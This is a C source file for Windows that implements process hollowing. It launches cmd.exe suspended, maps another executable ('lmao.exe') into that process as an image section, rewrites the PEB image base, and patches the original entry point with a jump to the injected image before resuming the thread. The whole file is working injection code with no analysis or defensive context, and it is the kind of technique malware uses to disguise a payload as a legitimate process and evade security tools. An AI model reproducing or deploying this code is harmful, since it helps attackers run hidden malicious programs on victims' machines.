#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

int main() {
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    char target[] = "cmd.exe";
    CreateProcessA(NULL, target, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    
    PVOID hostBase = NULL;
    ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &hostBase, sizeof(PVOID), NULL); //ImageBase

    BYTE hostHeader[0x1000];
    ReadProcessMemory(pi.hProcess, hostBase, hostHeader, 0x1000, NULL);
    PIMAGE_DOS_HEADER hostDos = (PIMAGE_DOS_HEADER)hostHeader;
    PIMAGE_NT_HEADERS hostNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)hostHeader + hostDos->e_lfanew);
    PVOID hostEntryPoint = (PVOID)((ULONG_PTR)hostBase + hostNt->OptionalHeader.AddressOfEntryPoint);

    HANDLE hFile = CreateFileA("lmao.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hSection;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);

    PVOID newBaseAddress = NULL; 
    SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, pi.hProcess, &newBaseAddress, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    BYTE newHeader[0x1000];
    ReadProcessMemory(pi.hProcess, newBaseAddress, newHeader, 0x1000, NULL);
    PIMAGE_DOS_HEADER newDos = (PIMAGE_DOS_HEADER)newHeader;
    PIMAGE_NT_HEADERS newNt = (PIMAGE_NT_HEADERS)((ULONG_PTR)newHeader + newDos->e_lfanew);
    PVOID newEntryPoint = (PVOID)((ULONG_PTR)newBaseAddress + newNt->OptionalHeader.AddressOfEntryPoint);

    WriteProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &newBaseAddress, sizeof(PVOID), NULL);

    BYTE patch[12] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 }; //patch jmp den entrypoint moi vao entrypoint cu
    memcpy(&patch[2], &newEntryPoint, 8);

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, hostEntryPoint, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    WriteProcessMemory(pi.hProcess, hostEntryPoint, patch, sizeof(patch), NULL);
    VirtualProtectEx(pi.hProcess, hostEntryPoint, sizeof(patch), oldProtect, &oldProtect);
    ResumeThread(pi.hThread);

    CloseHandle(hFile);
    CloseHandle(hSection);
    return 0;
}
